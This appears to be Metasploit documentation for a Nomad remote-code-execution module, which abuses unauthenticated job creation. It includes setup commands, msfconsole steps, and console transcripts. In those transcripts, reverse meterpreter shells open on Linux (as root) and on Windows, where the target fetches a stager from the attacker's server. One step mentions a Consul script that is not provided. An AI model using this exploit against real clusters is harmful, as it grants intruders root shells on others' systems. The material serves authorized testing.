### Description

HashiCorp Nomad allows for clients to create jobs that can run in a Nomad cluster. Nomad provides a variety of drivers to allow for tasks to be run under. The 'raw_exec' and 'exec' drivers allow for OS commands to be run on a Nomad client. The 'raw_exec' option runs with higher privileges, while 'exec' is typically limited to lower privileges.

The API operates similarly to HashiCorp's Consul service, by allowing optional ACL tokens as an authentication mechanism. This is not enabled by default.

### Test Setup

First install Nomad (https://www.nomadproject.io/downloads)

```
curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
sudo apt-get update && sudo apt-get install nomad -y
```

Start Nomad

```
sudo nomad agent -dev -bind 0.0.0.0 -log-level INFO
```

Nomad should start up like the following:

```
==> No configuration files loaded
==> Starting Nomad agent...
==> Nomad agent configuration:

       Advertise Addrs: HTTP: 192.168.1.2:4646; RPC: 192.168.1.2:4647; Serf: 192.168.1.2:4648
            Bind Addrs: HTTP: 0.0.0.0:4646; RPC: 0.0.0.0:4647; Serf: 0.0.0.0:4648
                Client: true
             Log Level: INFO
                Region: global (DC: dc1)
                Server: true
               Version: 1.0.5

==> Nomad agent started! Log data will stream in below:

    2021-05-18T09:51:21.880-0500 [INFO]  agent: detected plugin: name=docker type=driver plugin_version=0.1.0
    2021-05-18T09:51:21.880-0500 [INFO]  agent: detected plugin: name=raw_exec type=driver plugin_version=0.1.0
    2021-05-18T09:51:21.880-0500 [INFO]  agent: detected plugin: name=exec type=driver plugin_version=0.1.0
    2021-05-18T09:51:21.880-0500 [INFO]  agent: detected plugin: name=qemu type=driver plugin_version=0.1.0
    2021-05-18T09:51:21.880-0500 [INFO]  agent: detected plugin: name=java type=driver plugin_version=0.1.0
    2021-05-18T09:51:21.880-0500 [INFO]  agent: detected plugin: name=nvidia-gpu type=device plugin_version=0.1.0
    2021-05-18T09:51:21.894-0500 [INFO]  nomad.raft: initial configuration: index=1 servers="[{Suffrage:Voter ID:192.168.1.2:4647 Address:192.168.1.2:4647}]"
    2021-05-18T09:51:21.894-0500 [INFO]  nomad.raft: entering follower state: follower="Node at 192.168.1.2:4647 [Follower]" leader=
    2021-05-18T09:51:21.898-0500 [INFO]  nomad: serf: EventMemberJoin: nomad.global 192.168.1.2
    2021-05-18T09:51:21.898-0500 [INFO]  nomad: starting scheduling worker(s): num_workers=8 schedulers=[service, batch, system, _core]
    2021-05-18T09:51:21.900-0500 [INFO]  nomad: adding server: server="nomad.global (Addr: 192.168.1.2:4647) (DC: dc1)"
    2021-05-18T09:51:21.918-0500 [INFO]  client: using state directory: state_dir=/tmp/NomadClient084393005
    2021-05-18T09:51:21.918-0500 [INFO]  client: using alloc directory: alloc_dir=/tmp/NomadClient993736104
    2021-05-18T09:51:21.922-0500 [INFO]  client.fingerprint_mgr.cgroup: cgroups are available
    2021-05-18T09:51:23.045-0500 [WARN]  nomad.raft: heartbeat timeout reached, starting election: last-leader=
    2021-05-18T09:51:23.045-0500 [INFO]  nomad.raft: entering candidate state: node="Node at 192.168.1.2:4647 [Candidate]" term=2
    2021-05-18T09:51:23.045-0500 [INFO]  nomad.raft: election won: tally=1
    2021-05-18T09:51:23.045-0500 [INFO]  nomad.raft: entering leader state: leader="Node at 192.168.1.2:4647 [Leader]"
    2021-05-18T09:51:23.045-0500 [INFO]  nomad: cluster leadership acquired
    2021-05-18T09:51:23.052-0500 [INFO]  nomad.core: established cluster id: cluster_id=3266f8d4-f93b-0491-f352-b508401faeb7 create_time=1621349483050579397
    2021-05-18T09:51:28.066-0500 [INFO]  client.plugin: starting plugin manager: plugin-type=csi
    2021-05-18T09:51:28.066-0500 [INFO]  client.plugin: starting plugin manager: plugin-type=driver
    2021-05-18T09:51:28.066-0500 [INFO]  client.plugin: starting plugin manager: plugin-type=device
    2021-05-18T09:51:33.588-0500 [INFO]  client: started client: node_id=4b972587-fc0c-3937-29db-318433d0135a
    2021-05-18T09:51:33.606-0500 [INFO]  client: node registration complete
    2021-05-18T09:51:34.608-0500 [INFO]  client: node registration complete
```

## Verification Steps

You can verify the module against the vulnerable application with those steps:

  1. Launch a Consul cluster with the provided bash script
  2. Start msfconsole
  3. Do: `use exploit/multi/misc/nomad_exec`
  4. Do: `set RHOST 192.168.1.2`
  5. Do: `set RPORT 4646`
  6. Do: `check`. The target should show as vulnerable.
  7. Do: `set payload` with the payload of your choosing.
  8. Do: `set LHOST eth0` (Attacker's default NIC)
  9. Do: `run`
  10. You should get a shell.

## Scenarios

### Reverse shell on Linux host

```
msf6 > use exploit/multi/misc/nomad_exec
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/misc/nomad_exec) > set RHOST 192.168.1.2
RHOST => 192.168.1.2
msf6 exploit(multi/misc/nomad_exec) > set RPORT 4646
RPORT => 4646
msf6 exploit(multi/misc/nomad_exec) > check
[+] 192.168.1.2:4646 - The target is vulnerable.
msf6 exploit(multi/misc/nomad_exec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/misc/nomad_exec) > set LHOST eth0
LHOST => eth0
msf6 exploit(multi/misc/nomad_exec) > run

[*] Started reverse TCP handler on 192.168.1.3:4444 
[*] Creating job 'RjLhSsR'
[*] Job 'RjLhSsR' successfully created as '9ea94eb3-5a63-d9e2-dd36-3375ee301d5d'.
[*] Waiting for job 'RjLhSsR' to trigger
[*] Sending stage (984904 bytes) to 192.168.1.2
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.2:53978) at 2021-05-18 10:01:00 -0500
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > sysinfo
Computer     : 192.168.1.2
OS           : Ubuntu 18.04 (Linux 4.15.0-128-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: root @ nomad (uid=0, gid=0, euid=0, egid=0)

```

### Reverse shell on Windows host

```
msf6 > use exploit/multi/misc/nomad_exec
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/misc/nomad_exec) > set RHOSTS 192.168.1.4
RHOSTS => 192.168.1.4
msf6 exploit(multi/misc/nomad_exec) > set RPORT 4646
RPORT => 4646
msf6 exploit(multi/misc/nomad_exec) > set TARGET Windows 
TARGET => Windows
msf6 exploit(multi/misc/nomad_exec) > check
[+] 192.168.1.4:4646 - The target is vulnerable.
msf6 exploit(multi/misc/nomad_exec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/misc/nomad_exec) > set LHOST eth0
LHOST => eth0
msf6 exploit(multi/misc/nomad_exec) > run

[*] Started reverse TCP handler on 192.168.1.3:4444 
[*] Using URL: http://0.0.0.0:8080/7xalf9984X4by
[*] Local IP: http://192.168.1.3:8080/7xalf9984X4by
[*] Creating job 'WgsLus'
[*] Job 'WgsLus' successfully created as 'fba1132d-c381-3945-e5e4-5e7ebdd24aa5'.
[*] Waiting for job 'WgsLus' to trigger
[*] Client 192.168.1.4 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.610) requested /7xalf9984X4by
[*] Sending payload to 192.168.1.4 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.610)
[*] Sending stage (175174 bytes) to 192.168.1.4
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.4:52922) at 2021-05-18 10:08:23 -0500
[*] Command Stager progress - 100.00% done (151/151 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer        : DESKTOP-1CE7MB4
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

```
